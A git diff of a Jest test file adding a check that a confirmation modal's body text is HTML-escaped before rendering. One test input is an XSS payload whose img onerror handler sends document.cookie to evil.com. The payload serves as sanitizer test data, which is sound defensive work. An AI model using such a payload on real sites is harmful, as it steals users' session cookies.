@@ -1,6 +1,7 @@
 import { UX } from '../../src/core-api/ux';
 import { DirtyStatusService } from '../../src/services/dirty-status.service';
 import { serviceRegistry } from '../../src/services/service-registry';
+import { EscapingHelpers } from '../../src/utilities/helpers/escaping-helpers';
 import { UserSettingsHelper } from '../../src/utilities/helpers/usersetting-dialog-helpers';
 
 describe('UX', () => {
@@ -109,13 +110,13 @@ describe('UX', () => {
       luigiMock.i18n.mockReturnValue(i18n);
       const promise = ux.showConfirmationModal({
         header: 'h',
-        body: 'b',
+        body: 'Some body text',
         buttonConfirm: 'ok',
         buttonDismiss: 'cancel'
       });
       const [translated, handler] = connectorMock.renderConfirmationModal.mock.calls[0];
       expect(translated.header).toBe('t(h)');
-      expect(translated.body).toBe('t(b)');
+      expect(translated.body).toBe('Some body text');
       expect(translated.buttonConfirm).toBe('t(ok)');
       expect(translated.buttonDismiss).toBe('t(cancel)');
       handler.confirm();
@@ -131,6 +132,31 @@ describe('UX', () => {
       expect(translated.body).toBe('luigi.confirmationModal.body');
       expect(translated.buttonConfirm).toBe('luigi.button.confirm');
       expect(translated.buttonDismiss).toBe('luigi.button.dismiss');
+    });
+
+    it.each([
+      {
+        input: 'Are you sure <b>you want</b> to do this?',
+        output: 'Are you sure <b>you want</b> to do this?'
+      },
+      {
+        input: '<img src="https://example.com/logo.png" />',
+        output: '&lt;img src=&quot;https://example.com/logo.png&quot; /&gt;'
+      },
+      {
+        input: '<img src=x onerror="fetch(\'https://evil.com?\'+document.cookie)">',
+        output: '&lt;img src=x onerror=&quot;fetch(&#39;https://evil.com?&#39;+document.cookie)&quot;&gt;'
+      }
+    ])('sanitizes body content', async (data) => {
+      const sanitizeHtmlSpy = jest.spyOn(EscapingHelpers, 'sanatizeHtmlExceptTextFormatting');
+      const i18n = { getTranslation: jest.fn((key: string) => `t(${key})`) };
+      luigiMock.i18n.mockReturnValue(i18n);
+      const promise = ux.showConfirmationModal({ body: data.input });
+      const [translated, handler] = connectorMock.renderConfirmationModal.mock.calls[0];
+      expect(sanitizeHtmlSpy).toHaveBeenCalledWith(data.input);
+      expect(translated.body).toBe(data.output);
+      handler.confirm();
+      await expect(promise).resolves.toBe(true);
     });
 
     it('rejects on dismiss', async () => {
